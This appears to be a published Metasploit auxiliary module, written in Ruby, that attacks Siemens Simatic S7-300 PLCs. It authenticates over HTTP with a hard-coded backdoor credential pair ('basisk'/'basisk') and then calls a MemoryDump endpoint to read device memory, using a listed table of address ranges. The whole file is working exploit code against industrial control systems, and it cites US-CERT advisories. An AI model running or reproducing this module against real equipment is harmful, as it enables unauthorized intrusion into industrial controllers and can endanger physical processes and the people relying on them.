# Exploit Title: Siemens Simatic S7 300 Remote Memory Viewer Backdoor
# Date: 7-13-2012
# Exploit Author: Dillon Beresford
# Vendor Homepage: http://www.siemens.com/
# Tested on: Siemens Simatic S7-1200 PLC
# CVE : None

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::Remote::HttpClient
	include Msf::Auxiliary::Scanner

	def initialize(info = {})
		super(update_info(info,
			'Name'        => 'Siemens Simatic S7-300 PLC Remote Memory Viewer',
			'Description' => %q{ This module attempts to authenticate using a hard-coded backdoor password in
							   the Simatic S7-300 PLC and dumps the device memory using system commands.
							   Mode: Values 8, 16 or 32 bit access
							   Valid address areas are:
							   80000000 - 81FFFFFF SD-Ram cached
							   A0000000 - A1FFFFFF SD-Ram uncached
							   A8000000 - A87FFFFF Norflash
							   AFC00000 - AFC7FFFF ED-Ram int. uncached
							   BFE00000 - BFEFFFFD COM-ED-Ram ext.
							   C0000000 - C007FFFF ED-Ram int. cached
							   D0000000 - D0005FFF Scratchpad data int.
							   D4000000 - D4005FFF Scratchpad code int.
							   F0100000 - F018FFFF SPS-Asic 16-Bit access only
				},
			  'Author'			=> 'Dillon Beresford',
  		  'License'     			=> MSF_LICENSE,
  		  'References'     =>
  				[
  				  [ 'URL', 'http://www.us-cert.gov/control_systems/pdf/ICS-ALERT-11-204-01%20S7-300_S7-400.pdf' ],
  					[ 'URL', 'http://www.us-cert.gov/control_systems/pdf/ICS-ALERT-11-186-01.pdf' ],
  					[ 'URL', 'http://www.us-cert.gov/control_systems/pdf/ICS-ALERT-11-161-01.pdf' ],
  				],
  			'Version'        => '$Revision$',
  		  'DisclosureDate' => 'June 2011'
  		  ))
		    register_options(
			    [
				    Opt::RPORT(8080),
				    OptString.new('USER', [ true, 'Simatic S7-300 hardcoded username.', 'basisk']),
				    OptString.new('PASS', [ true, 'Simatic S7-300 hardcoded password.', 'basisk']),
				    OptString.new('MODE', [ true, 'Memory Read Mode (8-bit, 16-bit, 32-bit)', '32']),
				    OptString.new('HEX', [ true, 'Simatic S7-300 memory offset', '1']),
				    OptString.new('OFFSET', [ true, 'Simatic S7-300 memory offset']),
				    OptString.new('LENGTH', [ true, 'Memory Dump Length in Bits', '256'])
			], self.class)
	end

	def run_host(ip)

		begin
			user = datastore['USER']
			pass = datastore['PASS']

			print_status("Attempting to connect to #{rhost}:#{rport}")
			len = '1024'
			login = send_request_raw(
				{
					'method'	=> 'GET',
					'uri'	=> "/login?User="+user+"&Password="+pass
				})


			if (login)

			request = send_request_raw(
				{
					'method'  => 'GET',
					'uri'     => "/tools/MemoryDump?Address="+datastore['OFFSET']+"&"+"Hex="+datastore['HEX']+"&"+"Length="+datastore['LENGTH']+"&Mode="+ datastore['MODE']
				})
				if (request and request.code == 200)

				print_good("Success! Dumping Memory on #{rhost} \r\n\n#{request.body}")
				elsif (request and request.code)
					print_error("Attempt #HTTP error #{request.code} on #{rhost}")
				end
			end

		rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
		rescue ::Timeout::Error, ::Errno::EPIPE
		rescue ::LocalJumpError
		end
	end
end